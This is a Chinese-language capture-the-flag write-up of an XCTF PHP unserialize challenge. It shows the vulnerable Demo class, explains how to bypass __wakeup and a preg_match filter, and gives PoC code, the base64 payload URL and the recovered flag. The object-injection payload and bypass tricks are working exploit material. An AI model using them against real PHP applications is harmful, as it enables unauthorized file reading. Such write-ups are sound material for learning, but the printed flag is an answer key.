**一.题目链接：**[**https://adworld.xctf.org.cn/challenges/list?rwNmOdr=1711518749283**](https://adworld.xctf.org.cn/challenges/list?rwNmOdr=1711518749283)

**二.题目内容**

```php
<?php 
  class Demo { 
  private $file = 'index.php';
  public function __construct($file) { 
    $this->file = $file; 
  }
function __destruct() { 
  echo @highlight_file($this->file, true); 
}
function __wakeup() { 
  if ($this->file != 'index.php') { 
    //the secret is in the fl4g.php
    $this->file = 'index.php'; 
  } 
} 
}
if (isset($_GET['var'])) { 
  $var = base64_decode($_GET['var']); 
  if (preg_match('/[oc]:\d+:/i', $var)) { 
    die('stop hacking!'); 
  } else {
    @unserialize($var); 
  } 
} else { 
  highlight_file("index.php"); 
} 
?>
```

**三.题目解析**

题目定义了一个Demo类，并定义了三个反序列化时调用的魔术方法函数，需要用GET方式传参给变量var传值来获取fl4g.php。var的内容需要满足以下条件：

    - 绕过__wakeup()

反序列化函数unserialize()执行时会先检查是否定义了wakeup()，如果定义了则先执行wakeup()，使得$this->file指向index.php而不是自己定义的目标文件fl4g.php。相关知识点：__wakeup()只有在被反序列化的对象的属性个数与对象的真实属性个数一致时才会执行，否则会绕过。

    - 绕过正则表达式preg_match()

preg_match('/[oc]:\d+:/i', $var)检查了$var中是否有"o:数字"或者"c:数字"的形式（不区分大小写），如果有则不进行后续的反序列化操作。

    - base64编码

最容易实现的条件。

**四.编写PoC**

```php
<?php 
  class Demo { 
  private $file = 'index.php';
  public function __construct($file) { 
  $this->file = $file; 
}
function __destruct() { 
  echo @highlight_file($this->file, true); 
}
function __wakeup() { 
  if ($this->file != 'index.php') { 
    //the secret is in the fl4g.php
    $this->file = 'index.php'; 
  } 
} 
}
$A = new Demo ('fl4g.php');					//创建对象
$C = serialize($A);                     //对对象A进行序列化
$C = str_replace('O:4','O:+4',$C);      //绕过正则表达式过滤
$C = str_replace(':1:',':2:',$C); 		//wakeup绕过
var_dump($C);
var_dump(base64_encode($C));            //base64加密

?>
```

输出以下内容

```php
string(49) "O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}"
string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="
```

	payload如下

> [http://61.147.171.105:62234/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==](http://61.147.171.105:62234/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==)
>



<font style="color:#0000bb;">flag</font><font style="color:#007700;">=</font><font style="color:#dd0000;">"ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}"</font>

